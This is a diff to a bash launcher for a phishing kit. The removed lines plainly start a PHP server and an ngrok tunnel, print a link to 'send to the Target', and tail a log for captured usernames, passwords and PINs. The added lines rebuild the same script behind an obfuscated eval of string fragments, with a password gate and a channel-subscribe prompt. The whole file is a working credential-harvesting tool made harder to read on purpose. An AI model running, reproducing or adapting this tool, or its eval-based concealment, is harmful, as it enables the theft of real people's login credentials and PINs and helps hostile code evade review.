@@ -1,38 +1,5 @@
-#!/bin/bash
-
-php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
-ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
-kill -9 $php
-kill -9 $ngrok
-clear
-banner(){
-curl -s http://artscene.textfiles.com/vt100/monkey.vt | pv -q -L 10000
-echo -e "\e[1;33mSubscribe channel admin untuk mendapatkan akses"
-sleep 2.8
-
-clear
-
-}
-
-start(){
-cd situs/
-cd follow/
-echo ""
-echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
-php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-sleep 3
-echo ""
-echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
-./ngrok http 4444 > /dev/null 2>&1 &
-sleep 25
-echo ""
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
-echo ""
-echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
-echo ""
-tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"                        
-}
-banner
-start
-
+#apa cok
+#gapapa
+z="
+";jz='://a';ECz=' -p ';Tz=' | g';OBz='kses';MCz=': " ';uCz=' SER';tz='t | ';Fz='p ph';GBz='hann';lDz='://[';VCz='>>>"';aEz='e "u';IEz='m %s';uz='pv -';sBz='es :';RCz='MERI';eDz='api/';XEz=' -f ';hCz='[1;3';FDz='/dev';KEz=' $li';LDz='OK S';TEz='L //';HBz='el a';ZDz='tp:/';aDz='/127';WEz='tail';QDz='./ng';DCz='read';LBz='enda';iDz='ep -';vDz='0m <';rCz='STAR';PEz='33m ';cz='r';Yz='$php';yCz='php ';tDz=';33m';nBz='7191';JDz='p 3';YCz='star';fBz='&t=9';dCz='cd f';Qz='k="$';BDz='27.0';JCz='d to';VEz='[0m'\''';yz='echo';XDz='-s -';sDz='tf "';YEz='log.';YBz='tube';vBz='l [ ';DEz='Targ';eEz='d" -';gCz='$'\''\e';tCz=' PHP';Az='php=';OCz='a';TBz='open';UBz=' htt';cCz='/';VDz='=$(c';jCz='e[0m';ACz='$pas';Kz='wk '\''';SDz=' 444';lz='ene.';mEz='er';bz='clea';pCz=';32m';Xz=' -9 ';tBz='v"';eCz='ollo';SCz='KSA ';ADz='-S 1';Vz='k | ';bDz='.0.0';NBz='an a';HEz='1;77';rBz='suks';FCz='"Mas';CDz='.0.1';fCz='w/';fEz='e "p';aCz='cd s';sCz='TING';Gz='p | ';UEz='  \e';XCz='}';kCz='\e[1';Dz='fw |';DBz='mSub';eBz='YxS8';Hz='grep';REz='REDE';WDz='url ';ABz=' -e ';DDz=':444';iBz='nta ';Jz=' | a';ODz=' \e[';wCz='// \';gDz='els ';kBz=' ke ';TCz='KEAM';LEz='nk';Mz='nt $';yDz='nd t';GEz='m\e[';Rz='(ps ';oBz=' ""';MDz='ERVE';jBz='pass';FEz='\e[0';KBz='uk m';Sz='-efw';PCz='done';vCz='VER ';WCz='p 2';xBz='apa"';cDz='.1:4';cEz='ame"';BEz=' to ';Nz='2}'\'')';AEz='his ';xDz='] Se';EDz='4 > ';jDz='o "h';uDz='[\e[';mBz='4664';vz='q -L';JEz='m\n"';iEz='"pin';Wz='kill';NCz='siap';xz='00';CCz='do';QEz='// C';rDz='prin';kEz=' "Pi';BCz='s" ]';PBz='slee';cBz='=oU0';oCz='3m]\';Iz=' -v ';wz=' 100';RBz='8';Bz='"$(p';nDz='-z]*';BBz='"\e[';kDz='ttps';MEz='3m\e';Ez=' gre';hz=' -s ';GDz='/nul';SEz='NTIA';hBz=' "mi';Cz='s -e';gEz='assw';wDz='<>> ';gz='curl';ez='er()';iz='http';qCz=' // ';hDz='| gr';LCz='ini ';OEz='e[1;';HCz=' pas';dDz='040/';rz='monk';IDz='&1 &';UCz='ANAN';YDz='N ht';mz='text';dBz='Sdx6';lCz=';77m';JBz=' unt';lBz='0896';EEz='et :';ZCz='t(){';fz='{';NDz='R //';ZEz='txt ';Zz='$ngr';hEz='ord"';mCz='+\e[';bEz='sern';ICz='swor';dEz='"pas';pDz='rok.';NEz='[0m\';PDz='0m'\''';jEz='" -e';QCz=' "ME';Uz='rep ';uBz='unti';RDz='rok ';aBz='/wat';az='ok';bBz='ch?v';lEz='n"';wBz='"$si';qz='100/';pz='m/vt';bCz='itus';WBz='/www';KCz='ols ';UDz='link';TDz='p 25';IBz='dmin';xCz=''\''';nEz='t';iCz='3m[\';XBz='.you';nCz='0m\e';sz='ey.v';KDz=' NGR';HDz='l 2>';FBz='be c';Pz='ngro';CEz='the ';oz='s.co';nz='file';CBz='1;33';yBz=' = "';qDz='io")';qBz='mit ';gBz='9s';SBz='xdg-';kz='rtsc';GCz='ukan';Oz='"';QBz='p 2.';EBz='scri';ZBz='.com';oDz='\.ng';dz='bann';MBz='patk';mDz='0-9a';pBz='="li';Lz='{pri';VBz='ps:/';fDz='tunn';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Hz$Jz$Kz$Lz$Mz$Nz$Oz$z$Pz$Qz$Rz$Sz$Tz$Uz$Pz$Vz$Hz$Iz$Hz$Jz$Kz$Lz$Mz$Nz$Oz$z$Wz$Xz$Yz$z$Wz$Xz$Zz$az$z$bz$cz$z$dz$ez$fz$z$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$z$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$Oz$z$PBz$QBz$RBz$z$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$gBz$z$yz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$Oz$z$yz$oBz$z$jBz$pBz$qBz$rBz$sBz$tBz$z$uBz$vBz$wBz$xBz$yBz$ACz$BCz$z$CCz$z$DCz$ECz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$OCz$z$PCz$z$yz$oBz$z$yz$QCz$RCz$SCz$TCz$UCz$VCz$z$PBz$WCz$z$bz$cz$z$XCz$z$YCz$ZCz$z$aCz$bCz$cCz$z$dCz$eCz$fCz$z$yz$oBz$z$yz$ABz$gCz$hCz$iCz$jCz$kCz$lCz$mCz$nCz$hCz$oCz$jCz$kCz$pCz$qCz$rCz$sCz$tCz$uCz$vCz$wCz$jCz$xCz$z$yCz$ADz$BDz$CDz$DDz$EDz$FDz$GDz$HDz$IDz$z$PBz$JDz$z$yz$oBz$z$yz$ABz$gCz$hCz$iCz$jCz$kCz$lCz$mCz$nCz$hCz$oCz$jCz$kCz$pCz$qCz$rCz$sCz$KDz$LDz$MDz$NDz$ODz$PDz$z$QDz$RDz$iz$SDz$EDz$FDz$GDz$HDz$IDz$z$PBz$TDz$z$yz$oBz$z$UDz$VDz$WDz$XDz$YDz$ZDz$aDz$bDz$cDz$dDz$eDz$fDz$gDz$hDz$iDz$jDz$kDz$lDz$mDz$nDz$oDz$pDz$qDz$z$rDz$sDz$kCz$tDz$uDz$vDz$wDz$kCz$tDz$xDz$yDz$AEz$UDz$BEz$CEz$DEz$EEz$FEz$GEz$HEz$IEz$FEz$JEz$KEz$LEz$z$yz$oBz$z$yz$ABz$gCz$hCz$MEz$NEz$OEz$PEz$QEz$REz$SEz$TEz$UEz$VEz$z$yz$oBz$z$WEz$XEz$YEz$ZEz$hDz$iDz$aEz$bEz$cEz$ABz$dEz$ICz$eEz$fEz$gEz$hEz$ABz$iEz$jEz$kEz$lEz$z$XCz$z$dz$mEz$z$YCz$nEz"
